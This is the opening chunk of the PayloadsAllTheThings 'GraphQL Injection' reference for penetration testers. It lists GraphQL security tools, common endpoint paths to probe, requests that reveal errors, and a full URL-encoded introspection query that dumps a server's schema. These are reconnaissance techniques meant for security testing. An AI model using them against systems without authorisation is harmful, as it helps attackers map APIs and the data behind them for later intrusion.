<!-- source: GraphQL Injection/README.md | chunk 1/5 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->

# GraphQL Injection

> GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data. A GraphQL service is created by defining types and fields on those types, then providing functions for each field on each type

## Summary

- [Tools](#tools)
- [Enumeration](#enumeration)
    - [Common GraphQL Endpoints](#common-graphql-endpoints)
    - [Identify An Injection Point](#identify-an-injection-point)
    - [Enumerate Database Schema via Introspection](#enumerate-database-schema-via-introspection)
    - [Enumerate Database Schema via Suggestions](#enumerate-database-schema-via-suggestions)
    - [Enumerate Types Definition](#enumerate-types-definition)
    - [Enumerating Paths to a Target Type](#enumerating-paths-to-a-target-type)
- [Methodology](#methodology)
    - [Queries](#queries)
        - [Basic Query](#basic-query)
        - [Query with Arguments](#query-with-arguments)
        - [Nested Queries](#nested-queries)
    - [Mutations](#mutations)
    - [GraphQL Batching Attacks](#graphql-batching-attacks)
        - [JSON List Based Batching](#json-list-based-batching)
        - [Query Name Based Batching](#query-name-based-batching)
- [Injections](#injections)
    - [NOSQL Injection](#nosql-injection)
    - [SQL Injection](#sql-injection)
- [Labs](#labs)
- [References](#references)

## Tools

- [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - Scripting engine to interact with a graphql endpoint for pentesting purposes
- [doyensec/graph-ql](https://github.com/doyensec/graph-ql/) - GraphQL Security Research Material
- [doyensec/inql](https://github.com/doyensec/inql) - A Burp Extension for GraphQL Security Testing
- [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - parses GraphQL introspection schema and generates possible queries
- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - Lists the different ways of reaching a given type in a GraphQL schema
- [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - An extensive IDE for exploring GraphQL API's
- [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - Obtain GraphQL API schema despite disabled introspection
- [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - A GraphQL password brute-force and fuzzing utility
- [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - GraphQL threat framework used by security professionals to research security gaps in GraphQL implementations
- [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - Security Auditor Utility for GraphQL APIs
- [dolevf/graphw00f](https://github.com/dolevf/graphw00f) - GraphQL Server Engine Fingerprinting utility
- [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - Represent any GraphQL API as an interactive graph
- [Insomnia](https://insomnia.rest/) - Cross-platform HTTP and GraphQL Client

## Enumeration

### Common GraphQL Endpoints

GraphQL endpoints are often exposed at predictable paths, most commonly:

- `/graphql`
- `/graphiql` (interactive IDE)

You should always probe for both API and developer/debug interfaces.

```ps1
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
```

For an extended wordlist, see [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt).

### Identify An Injection Point

> A server MUST accept POST requests, and MAY accept other HTTP methods, such as GET. - [GraphQL Over HTTP](https://graphql.github.io/graphql-over-http/draft/#sec-Request)

- GET endpoint

    ```js
    GET /graphql?query={yourQueryHere}
    GET /graphql?query={__schema{types{name}}}
    GET /graphiql?query={__schema{types{name}}}
    GET /graphql?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D
    ```

- POST endpoint

    ```js
    POST /graphql/v1 HTTP/1.1
    Host: example.com
    Content-Type: application/json

    {
    "query": "query { user { id name } }"
    }
    ```

Check if errors are visible.

```javascript
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

### Enumerate Database Schema via Introspection

The GraphQL specification includes special fields, such as `__schema` and `__type`, that allow clients to ask the server what types exist, what fields they expose, and how everything connects together.

An introspection query is simply a request that leverages these special fields to retrieve that structural information. This is what allows interactive environments like GraphiQL or GraphQL Playground to provide auto-completion, inline documentation, and query validation. When a developer types a query, the tool is not guessing, it has already asked the server what is valid and what is not.

A minimal example looks like this:

```js
{
  "query": "{ __schema { types { name } } }"
}
```

URL encoded query to dump the database schema.

```js
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
